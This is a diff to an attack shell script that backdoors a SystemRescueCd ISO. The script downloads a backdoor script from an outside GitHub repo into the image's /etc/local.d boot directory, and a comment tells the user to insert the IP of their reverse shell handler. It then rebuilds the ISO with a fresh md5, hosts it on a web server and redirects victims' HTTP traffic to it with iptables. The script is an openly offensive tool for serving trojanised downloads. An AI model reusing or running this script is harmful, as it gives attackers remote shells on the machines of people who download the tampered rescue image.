@@ -23,7 +23,10 @@ cp -a ./backdoor-iso-ro/* ./backdoor-iso-rw/
 tar -C backdoor-stage3 -xvf ./stage3-latest.tar.xz
 unsquashfs -d ./backdoor-squash/ ./backdoor-iso-ro/sysrcd.dat
 
-curl --insecure https://bpaste.net/raw/3cea6ab189d8 > backdoor-stage3/etc/local.d/' '
+curl --insecure https://raw.githubusercontent.com/hackers-terabit/linuxmitm/master/backdoor.sh > backdoor-stage3/etc/local.d/' '
+#important - edit backdoor-stage3/etc/local.d/' '
+#make sure the IP contained is the IP your reverse shell handler is listening on
+
 cp backdoor-stage3/etc/local.d/' ' ./backdoor-squash/etc/local.d/' '
 
 chmod a+x ./backdoor-stag3/etc/local.d/' '
@@ -42,8 +45,7 @@ cd ../backdoor-iso-rw
 rm sysrcd*
 mv ../sysrcd-backdoored.dat ./sysrcd.dat
 md5sum sysrcd.dat > sysrcd.md5
-mkisofs -o ../out/systemrescuecd-x86-4.7.1.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V 
-systemrescuecd-x86-4.7.1 .
+mkisofs -o ../out/systemrescuecd-x86-4.7.1.iso -b isolinux/isolinux.bin -c isolinux/boot.cat -no-emul-boot -boot-load-size 4 -boot-info-table -J -R -V systemrescuecd-x86-4.7.1 .
 
 cd ..;ls -l out
 ########start and fork twisted web server to host the backdoored files###
@@ -59,4 +61,3 @@ iptables -t nat -A PREROUTING -i eth1 -p tcp -m tcp --dport 80 -j REDIRECT --to-
 
 
 #profit
-
